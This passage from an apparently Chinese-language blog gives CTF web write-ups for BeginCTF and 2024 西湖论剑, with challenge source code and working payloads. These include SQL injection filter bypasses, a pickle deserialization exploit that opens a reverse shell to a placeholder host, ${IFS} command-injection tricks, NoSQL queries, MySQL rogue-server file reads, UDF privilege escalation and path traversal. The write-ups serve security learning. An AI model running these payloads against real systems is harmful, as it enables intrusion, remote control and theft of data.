class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;&#125;&#125; <span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>();<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-variable">$b</span>;<span class="hljs-variable">$a</span>-&gt;p=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-variable">$c</span>;<span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));</code></pre></div><h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><p>哇，这页面也太好了，动态的</p><p><img src="/../images/BeginCTF-web/image-20240206171025833.png" alt="image-20240206171025833"></p><p>自己尝试即可</p><p>空格被过滤，然后其他双写绕过即可</p><div class="code-wrapper"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>(seselectlect<span class="hljs-comment">/**/</span><span class="hljs-built_in">group_concat</span>(flag)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>secret.passwoorrd)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>secret.passwoorrd<span class="hljs-meta">#</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>(seselectlect<span class="hljs-comment">/**/</span>group_concat(grade)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>scoorre<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>student<span class="hljs-comment">/**/</span>like<span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;begin&#x27;</span>)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>secret.passwoorrd<span class="hljs-meta">#</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>(seselectlect<span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-comment">/**/</span>like<span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;scoorre&#x27;</span>)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>secret.passwoorrd<span class="hljs-meta">#</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>loloadad_file(<span class="hljs-string">&#x27;/flag&#x27;</span>)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>secret.passwoorrd<span class="hljs-meta">#</span></code></pre></div><h2 id="Pickelshop"><a href="#Pickelshop" class="headerlink" title="Pickelshop *"></a>Pickelshop *</h2><p><img src="/../images/BeginCTF-web/image-20240206171254846.png" alt="image-20240206171254846"></p><p><img src="/../images/BeginCTF-web/image-20240206171306598.png" alt="image-20240206171306598"></p><p>这里我拿到cookie后拿去base64解密，发现是乱码就没思路了</p><p>结果base64解密后拿去pickle.loads一下才行</p><p><img src="/../images/BeginCTF-web/image-20240206171414099.png" alt="image-20240206171414099"></p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">class</span> exp(<span class="hljs-keyword">object</span>):    def __reduce__(self):        s = &quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &quot;&quot;&quot;        <span class="hljs-keyword">return</span> os.<span class="hljs-keyword">system</span>, (s,) e = exp()s = pickle.dumps(e)<span class="hljs-keyword">user</span> = base64.b64encode(s).decode()print(<span class="hljs-keyword">user</span>)</code></pre></div><p>在linux环境下运行</p><p><img src="/../images/BeginCTF-web/image-20240206171534358.png" alt="image-20240206171534358"></p><p>。。。。不难，是自己没测出来</p><h2 id="readbooks"><a href="#readbooks" class="headerlink" title="readbooks *"></a>readbooks *</h2><p><img src="/../images/BeginCTF-web/image-20240206171617787.png" alt="image-20240206171617787"></p><p>这里我就测试了一下..&#x2F;目录穿越，但是显示banned，然后就没思路了</p><p>结果*竟然可以，list目录也是同理</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_templateapp = Flask(__name__)DISALLOWED1 = [<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>]DISALLOWED_FILES = [<span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>, <span class="hljs-string">&#x27;etc&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;blacklist&#x27;</span>]BLACKLIST = [x[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./blacklist.txt&quot;</span>).readlines()][:-<span class="hljs-number">1</span>]BLACKLIST.append(<span class="hljs-string">&quot;/&quot;</span>)BLACKLIST.append(<span class="hljs-string">&quot;\\&quot;</span>)BLACKLIST.append(<span class="hljs-string">&quot; &quot;</span>)BLACKLIST.append(<span class="hljs-string">&quot;\t&quot;</span>)BLACKLIST.append(<span class="hljs-string">&quot;\n&quot;</span>)BLACKLIST.append(<span class="hljs-string">&quot;tc&quot;</span>)ALLOW = [    <span class="hljs-string">&quot;&#123;&quot;</span>,    <span class="hljs-string">&quot;&#125;&quot;</span>,    <span class="hljs-string">&quot;[&quot;</span>,    <span class="hljs-string">&quot;pwd&quot;</span>,    <span class="hljs-string">&quot;-&quot;</span>,    <span class="hljs-string">&quot;_&quot;</span>]<span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ALLOW:    <span class="hljs-keyword">try</span>:        BLACKLIST.remove(a)    <span class="hljs-keyword">except</span> ValueError:        <span class="hljs-keyword">pass</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/public/&lt;path:name&gt;&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">readbook</span>(<span class="hljs-params">name</span>):    name = <span class="hljs-built_in">str</span>(name)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> DISALLOWED1:        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> DISALLOWED_FILES:        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> name:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> BLACKLIST:        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> name:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span>    <span class="hljs-built_in">print</span>(name)    <span class="hljs-keyword">try</span>:        res = os.popen(<span class="hljs-string">&#x27;cat &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name)).read()        <span class="hljs-keyword">return</span> res    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/list/&lt;path:name&gt;&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">listbook</span>(<span class="hljs-params">name</span>):    name = <span class="hljs-built_in">str</span>(name)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> DISALLOWED1:        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> DISALLOWED_FILES:        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> name:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> BLACKLIST:        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> name:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span>    <span class="hljs-built_in">print</span>(name)    cmd = <span class="hljs-string">&#x27;ls &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name)    <span class="hljs-keyword">try</span>:        res = os.popen(cmd).read()        <span class="hljs-keyword">return</span> res    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8878</span>)</code></pre></div><p>这里大佬的解法是</p><div class="code-wrapper"><pre><code class="hljs autohotkey">`echo &#x27;/flag&#x27;`</code></pre></div><p>构造出&#x2F;flag字符串</p><p>echo被过滤使用’ec’’ho’， 空格被过滤使用${IFS}</p><p>然后&#x2F;flag通过base64编码，L2ZsYWc&#x3D;，但是等号被过滤，可以对&#x2F;flag编码得到L2ZsYWcq</p><p><img src="/../images/BeginCTF-web/image-20240206172029153.png" alt="image-20240206172029153"></p><p>得到flag的文件是&#x2F;_flag</p><p>对&#x2F;_flag 进行编码L19mbGFn</p><p>再传入payload</p><div class="code-wrapper"><pre><code class="hljs awk">`<span class="hljs-string">&#x27;ec&#x27;</span><span class="hljs-string">&#x27;ho&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>L19mbGFn|<span class="hljs-string">&#x27;ba&#x27;</span><span class="hljs-string">&#x27;se64&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>-d`</code></pre></div><p><img src="/../images/BeginCTF-web/image-20240206172055769.png" alt="image-20240206172055769"></p><p>。。。唉，有点难，想不到啊</p><h2 id="king"><a href="#king" class="headerlink" title="king *"></a>king *</h2><p>唉，游戏通关了，都没点思路</p><p><img src="/../images/BeginCTF-web/image-20240206172227912.png" alt="image-20240206172227912"></p><p>抓到了websocket的流量</p><p><img src="/../images/BeginCTF-web/image-20240206172245734.png" alt="image-20240206172245734"></p><p>但是我没想那么多，我以为就是正常的数据而已</p><p><img src="/../images/BeginCTF-web/image-20240206172323350.png" alt="image-20240206172323350"></p><p>。。。大佬的思维真厉害</p><p>但是这查询语句我也不知道啊（呜呜呜</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;listCollections&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/BeginCTF-web/image-20240206172402364.png" alt="image-20240206172402364"></p><p>然后可以用find命令去读flag文件值</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;find&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;flagjyqe9i21fcf&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/BeginCTF-web/image-20240206172541359.png" alt="image-20240206172541359"></p><p>这些命令在那些nosql文章中有出现，但也不是这个形式啊。。。不会用</p><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>唉，菜死了，四道题解不出来</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/uuzeray/article/details/136032992?spm=1001.2014.3001.5501">【Web】小白也能看懂的BeginCTF个人wp（全）-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024西湖论剑</title>
    <link href="/2024/02/04/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <url>/2024/02/04/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    
    <content type="html"><![CDATA[<h1 id="2024西湖论剑"><a href="#2024西湖论剑" class="headerlink" title="2024西湖论剑"></a>2024西湖论剑</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有一道misc取证服了，最后一个小时以为我能搞出来，结果各个地方到处卡壳，甚至到了最后一步也卡住，幸好队友最后也解了出来。。。</p><p>寄，还得是unknown和23级大佬们带飞，可惜排名不高</p><p>这次看看web部分和数据安全部分的phpems</p><h2 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h2><p>唉，对php连接数据库不熟悉，我只知道jdbc连接存在任意文件读取，没想到php也可以</p><p>还得是unknown，我是菜狗</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211033429032.png" alt="image-20240211033429032"></p><p>连接上后可以执行任意命令</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211033513375.png" alt="image-20240211033513375"></p><p>我们可以vps搭建好后，连接我们vps的数据库</p><p>然后使用<code>LOAD DATA INFILE</code>语法读取本地文件</p><p>不过还是使用工具搭建恶意服务端读取任意文件方便</p><p>没什么能读的，那就读取<code>query.php</code>文件内容咯</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// mine</span><span class="hljs-comment">// $db_host = &#x27;127.0.0.1&#x27;;</span><span class="hljs-comment">// $db_username = &#x27;root&#x27;;</span><span class="hljs-comment">// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;</span><span class="hljs-comment">// $db_name = &#x27;mysql&#x27;;</span><span class="hljs-variable">$db_host</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;db_host&quot;</span>];<span class="hljs-variable">$db_username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;db_username&quot;</span>];<span class="hljs-variable">$db_password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;db_password&quot;</span>];<span class="hljs-variable">$db_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;db_name&quot;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$db_host</span>))&#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$db_host</span>;dbname=<span class="hljs-subst">$db_name</span>&quot;</span>;        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$db_username</span>, <span class="hljs-variable">$db_password</span>);        <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;dsn&#x27;</span>]=<span class="hljs-variable">$dsn</span>;        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;db_username&#x27;</span>]=<span class="hljs-variable">$db_username</span>;        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;db_password&#x27;</span>]=<span class="hljs-variable">$db_password</span>;    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;       <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());    &#125;&#125;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;dsn&#x27;</span>]))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;请先连接数据库&#x27;);window.location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>发现题目本地数据库的账号和密码</p><p>连接，然后正常查询表，发现secret数据库下有个flag表</p><div class="code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>DASCTF&#123;<span class="hljs-number">3386201718692</span><span class="hljs-keyword">Try</span> <span class="hljs-keyword">to</span> become ROOT</code></pre></div><p>那提权第一想法就是udf提权</p><p><code>show variables like &#39;%priv%&#39;</code></p><div class="code-wrapper"><pre><code class="hljs Bash">Variable_name  Valueautomatic_sp_privileges  ONsecure_file_privsha256_password_private_key_path  private_key.pem</code></pre></div><p><code>show variables like &#39;%plugin%&#39;</code></p><div class="code-wrapper"><pre><code class="hljs Bash">Variable_nameValuedefault_authentication_pluginmysql_native_passwordplugin_dir  /usr/lib/mysql/p1ugin/</code></pre></div><div class="code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> &lt;udf.so的十六进制&gt; <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/p1ugin/udf.so&#x27;</span>;</code></pre></div><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211034310590.png" alt="image-20240211034310590"></p><h2 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h2><p>这题前半段顺了，但是unknown中间卡在了原型链污染上</p><p>我其实是想到了destructuredLocals的，但是当时unknown认为靠文件上传和改名覆盖掉模板文件就行，所以我去做misc去了</p><p>robots.txt</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/index<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/upload<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/rename<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/file<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/list</code></pre></div><p>上传任意一个文件，然后改名为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd（会显示改名失败，因为匹配到了<code>..</code>，但实际上改名成功了</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211043127361.png" alt="image-20240211043127361"></p><p>然后根据uuid去读，就能读到passwd。同理，读cmdline，得知源码在&#x2F;app&#x2F;index.js</p><p>思路真好，或者是本就是这个思路但是我太蠢了</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">var</span> _= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<span class="hljs-keyword">var</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>);<span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> putil_merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;putil-merge&quot;</span>)<span class="hljs-keyword">const</span> fileUpload = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-fileupload&#x27;</span>);<span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;uuid&#x27;</span>);<span class="hljs-keyword">const</span> &#123;value&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;lodash/seq&quot;</span>);<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<span class="hljs-comment">// 将文件信息存储到全局字典中</span><span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span> = <span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span> || &#123;&#125;;app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">fileUpload</span>());<span class="hljs-comment">// 使用 body-parser 处理 POST 请求的数据</span>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<span class="hljs-comment">// 设置模板的位置</span>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<span class="hljs-comment">// 设置模板引擎</span>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<span class="hljs-comment">// 静态文件（CSS）目录</span>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)))app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/index&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-comment">//显示上传页面</span>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;upload&#x27;</span>);&#125;);app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">const</span> file = req.<span class="hljs-property">files</span>.<span class="hljs-property">file</span>;    <span class="hljs-keyword">const</span> uniqueFileName = <span class="hljs-title function_">uuidv4</span>();    <span class="hljs-keyword">const</span> destinationPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>, file.<span class="hljs-property">name</span>);    <span class="hljs-comment">// 将文件写入 uploads 目录</span>    fs.<span class="hljs-title function_">writeFileSync</span>(destinationPath, file.<span class="hljs-property">data</span>);    <span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span>[uniqueFileName] = file.<span class="hljs-property">name</span>;    res.<span class="hljs-title function_">send</span>(uniqueFileName);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/list&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-comment">// const keys = Object.keys(global.fileDictionary);</span>    res.<span class="hljs-title function_">send</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span>);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/file&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">uniqueFileName</span>)&#123;        uniqueFileName = req.<span class="hljs-property">query</span>.<span class="hljs-property">uniqueFileName</span>        filName = <span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span>[uniqueFileName]        <span class="hljs-keyword">if</span>(filName)&#123;            <span class="hljs-keyword">try</span>&#123;                res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(__dirname+<span class="hljs-string">&quot;/uploads/&quot;</span>+filName).<span class="hljs-title function_">toString</span>())            &#125;<span class="hljs-keyword">catch</span> (error)&#123;                res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;文件不存在！&quot;</span>);            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;文件不存在！&quot;</span>);        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;file&#x27;</span>)    &#125;&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/rename&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span>&#123;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;rename&quot;</span>)&#125;);app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/rename&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">oldFileName</span> &amp;&amp; req.<span class="hljs-property">body</span>.<span class="hljs-property">newFileName</span> &amp;&amp; req.<span class="hljs-property">body</span>.<span class="hljs-property">uuid</span>)&#123;        oldFileName = req.<span class="hljs-property">body</span>.<span class="hljs-property">oldFileName</span>        newFileName = req.<span class="hljs-property">body</span>.<span class="hljs-property">newFileName</span>        uuid = req.<span class="hljs-property">body</span>.<span class="hljs-property">uuid</span>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">waf</span>(oldFileName)  &amp;&amp; <span class="hljs-title function_">waf</span>(newFileName) &amp;&amp;  <span class="hljs-title function_">waf</span>(uuid))&#123;            uniqueFileName = <span class="hljs-title function_">findKeyByValue</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span>,oldFileName)            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> uuid);            <span class="hljs-keyword">if</span> (uniqueFileName == uuid)&#123;                <span class="hljs-title function_">putil_merge</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">fileDictionary</span>,&#123;[uuid]:newFileName&#125;,&#123;<span class="hljs-attr">deep</span>:<span class="hljs-literal">true</span>&#125;)                <span class="hljs-keyword">if</span>(newFileName.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;..&#x27;</span>))&#123;                    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;文件重命名失败！！！&#x27;</span>);                &#125;<span class="hljs-keyword">else</span>&#123;                    fs.<span class="hljs-title function_">rename</span>(__dirname+<span class="hljs-string">&quot;/uploads/&quot;</span>+oldFileName, __dirname+<span class="hljs-string">&quot;/uploads/&quot;</span>+newFileName, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;                        <span 